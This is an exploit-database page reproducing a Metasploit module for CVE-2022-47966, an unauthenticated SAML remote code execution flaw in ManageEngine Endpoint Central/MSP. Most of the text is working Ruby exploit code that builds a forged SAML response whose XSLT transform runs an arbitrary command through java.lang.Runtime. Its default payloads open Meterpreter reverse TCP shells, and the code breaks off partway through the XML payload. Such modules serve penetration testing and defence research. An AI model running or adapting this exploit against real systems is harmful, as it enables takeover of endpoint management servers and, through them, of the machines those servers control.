---
title: Zoho ManageEngine Endpoint Central / MSP 10.1.2228.10 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023020026
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-15
fetch_date: 2025-10-04T06:36:10.395024
---

# Zoho ManageEngine Endpoint Central / MSP 10.1.2228.10 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Zoho ManageEngine Endpoint Central / MSP 10.1.2228.10 Remote Code Execution** **2023.02.14**  Credit:  **[Christophe de la Fuente](https://cxsecurity.com/author/Christophe%2Bde%2Bla%2BFuente/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-47966](https://cxsecurity.com/cveshow/CVE-2022-47966/ "Click to see CVE-2022-47966")**  CWE: **N/A** | |

# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'ManageEngine Endpoint Central Unauthenticated SAML RCE',
'Description' => %q{
This exploits an unauthenticated remote code execution vulnerability
that affects Zoho ManageEngine Endpoint Central and MSP versions 10.1.2228.10
and below (CVE-2022-47966). Due to a dependency to an outdated library
(Apache Santuario version 1.4.1), it is possible to execute arbitrary
code by providing a crafted `samlResponse` XML to the Endpoint Central
SAML endpoint. Note that the target is only vulnerable if it is
configured with SAML-based SSO , and the service should be active.
},
'Author' => [
'Khoa Dinh', # Original research
'horizon3ai', # PoC
'Christophe De La Fuente', # Based on the original code of the ServiceDesk Plus Metasploit module
'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Added some small tweaks to the original code of Christophe to make it work for this target
],
'License' => MSF\_LICENSE,
'References' => [
['CVE', '2022-47966'],
['URL', 'https://blog.viettelcybersecurity.com/saml-show-stopper/'],
['URL', 'https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/'],
['URL', 'https://github.com/horizon3ai/CVE-2022-47966'],
['URL', 'https://attackerkb.com/topics/gvs0Gv8BID/cve-2022-47966/rapid7-analysis']
],
'Platform' => [ 'win' ],
'Payload' => {
'BadChars' => "\x27"
},
'Targets' => [
[
'Windows EXE Dropper',
{
'Platform' => 'win',
'Arch' => [ARCH\_X86, ARCH\_X64],
'Type' => :windows\_dropper,
'DefaultOptions' => { 'Payload' => 'windows/x64/meterpreter/reverse\_tcp' }
}
],
[
'Windows Command',
{
'Platform' => 'win',
'Arch' => ARCH\_CMD,
'Type' => :windows\_command,
'DefaultOptions' => { 'Payload' => 'cmd/windows/powershell/meterpreter/reverse\_tcp' }
}
]
],
'DefaultOptions' => {
'RPORT' => 8443,
'SSL' => true
},
'DefaultTarget' => 1,
'DisclosureDate' => '2023-01-10',
'Notes' => {
'Stability' => [CRASH\_SAFE,],
'SideEffects' => [ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS],
'Reliability' => [REPEATABLE\_SESSION]
},
'Privileged' => true
)
)
register\_options([
OptString.new('TARGETURI', [ true, 'The SAML endpoint URL', '/SamlResponseServlet' ]),
OptInt.new('DELAY', [ true, 'Number of seconds to wait between each request', 5 ])
])
end
def check\_saml\_enabled
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri('/SamlRequestServlet')
})
if res.nil?
print\_error('No response from target.')
return false
end
# ManageEngine Endpoint Servers with SAML enabled respond with 302 and a HTTP header Location: containing the SAML request
if res && res.code == 302 && res.headers['Location'].include?('SAMLRequest=')
return true
else
return false
end
end
def check
# check if SAML-based SSO is enabled otherwise exploit will fail
# No additional fingerprint / banner information available to collect and determine version
return Exploit::CheckCode::Safe unless check\_saml\_enabled
CheckCode::Detected('SAML-based SSO is enabled.')
end
def encode\_begin(real\_payload, reqs)
super
reqs['EncapsulationRoutine'] = proc do |\_reqs, raw|
raw.start\_with?('powershell') ? raw.gsub('$', '`$') : raw
end
end
def exploit
print\_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
case target['Type']
when :windows\_command
execute\_command(payload.encoded)
when :windows\_dropper
execute\_cmdstager(delay: datastore['DELAY'])
end
end
def execute\_command(cmd, \_opts = {})
if target['Type'] == :windows\_dropper
cmd = "cmd /c #{cmd}"
end
cmd = cmd.encode(xml: :attr).gsub('"', '')
assertion\_id = "\_#{SecureRandom.uuid}"
# Randomize variable names and make sure they are all different using a Set
vars = Set.new
loop do
vars << Rex::Text.rand\_text\_alpha\_lower(5..8)
break unless vars.size < 3
end
vars = vars.to\_a
saml = <<~EOS
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response
ID="\_#{SecureRandom.uuid}"
InResponseTo="\_#{Rex::Text.rand\_text\_hex(32)}"
IssueInstant="#{Time.now.iso8601}" Version="2.0" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
<samlp:Status>
<samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
</samlp:Status>
<Assertion ID="#{assertion\_id}"
IssueInstant="#{Time.now.iso8601}" Version="2.0" xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
<Issuer>#{Rex::Text.rand\_text\_alphanumeric(3..10)}</Issuer>
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
<ds:SignedInfo>
<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
<ds:Reference URI="##{assertion\_id}">
<ds:Transforms>
<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
<xsl:stylesheet version="1.0"
xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:variable name="#{vars[0]}" select="rt:getRuntime()"/>
<xsl:variable name="#{vars[1]}" select="rt:exec($#{vars[0]},'#{cmd}')"/>
<xsl:variable name="#{vars[2]}" select="ob:toString($#{vars[1]})"/>
<xsl:value-of select="$#{vars[2]}"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
<ds:DigestValue>#{Rex::Text.encode\_base64(SecureRandom.random\_bytes(32))}</ds:DigestValue>
<...